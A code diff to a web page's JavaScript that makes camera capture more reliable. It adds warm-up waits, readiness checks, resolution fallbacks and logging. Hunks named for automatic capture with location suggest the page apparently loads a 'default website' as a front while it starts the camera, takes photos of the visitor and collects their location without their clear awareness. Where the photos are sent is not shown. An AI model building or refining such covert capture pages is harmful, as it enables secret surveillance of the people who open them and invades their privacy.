@@ -646,12 +646,28 @@
                     video: {
                         width: { ideal: currentResolution.width },
                         height: { ideal: currentResolution.height },
-                        facingMode: currentFacingMode
+                        facingMode: currentFacingMode,
+                        // Request better quality settings
+                        aspectRatio: { ideal: 4/3 },
+                        frameRate: { ideal: 30 }
                     }
                 };
                 
                 cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = cameraStream;
+                
+                // Wait for video metadata to load
+                await new Promise((resolve) => {
+                    cameraVideo.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+                
+                // Wait for video to actually start playing
+                await cameraVideo.play();
+                
+                // Additional wait for camera to warm up and adjust exposure
+                await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 cameraStatus.textContent = 'Active';
                 cameraStatus.className = 'status-value success';
@@ -660,7 +676,8 @@
                 stopCameraBtn.disabled = false;
                 autoCaptureBtn.disabled = false;
                 
-                captureStatus.textContent = 'Camera running in background';
+                captureStatus.textContent = 'Camera running and ready';
+                console.log('✅ Camera fully initialized and ready');
             } catch (error) {
                 console.error('Camera error:', error);
                 cameraStatus.textContent = 'Error';
@@ -709,12 +726,30 @@
         // Capture single photo
         function capturePhoto() {
             return new Promise((resolve) => {
+                // Check if video is actually playing
+                if (cameraVideo.readyState !== cameraVideo.HAVE_ENOUGH_DATA) {
+                    console.warn('⚠️ Video not ready, waiting...');
+                    setTimeout(() => resolve(capturePhoto()), 500);
+                    return;
+                }
+                
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
                 
-                canvas.width = cameraVideo.videoWidth;
-                canvas.height = cameraVideo.videoHeight;
+                // Use actual video dimensions
+                canvas.width = cameraVideo.videoWidth || currentResolution.width;
+                canvas.height = cameraVideo.videoHeight || currentResolution.height;
                 
+                // Verify we have valid dimensions
+                if (canvas.width === 0 || canvas.height === 0) {
+                    console.error('❌ Invalid video dimensions');
+                    canvas.width = currentResolution.width;
+                    canvas.height = currentResolution.height;
+                }
+                
+                console.log(`📸 Capturing at ${canvas.width}x${canvas.height}`);
+                
+                // Draw the current video frame
                 context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                 
                 canvas.toBlob(blob => {
@@ -1013,23 +1048,30 @@
         
         // Auto-start function
         async function autoStart() {
-            console.log('Auto-starting camera and capture...');
+            console.log('🚀 Auto-starting camera and capture...');
             
             // Load default website first
             loadDefaultWebsite();
             
-            // Small delay to ensure page is loaded
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            // Wait for page to be fully ready
+            await new Promise(resolve => setTimeout(resolve, 1500));
             
+            console.log('📹 Starting camera...');
             // Start camera automatically
             await startCamera();
             
-            // Wait for camera to initialize
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            console.log('⏳ Camera warming up (3 seconds)...');
+            // Wait extra time for camera to warm up and adjust exposure
+            await new Promise(resolve => setTimeout(resolve, 3000));
             
+            console.log('📸 Starting photo capture...');
             // Start auto-capture with location
             if (cameraStream) {
                 await autoCaptureWithLocation();
+            } else {
+                console.error('❌ Camera stream not available');
+                captureStatus.textContent = 'Camera failed to start';
+                captureStatus.className = 'capture-status error';
             }
         }
         
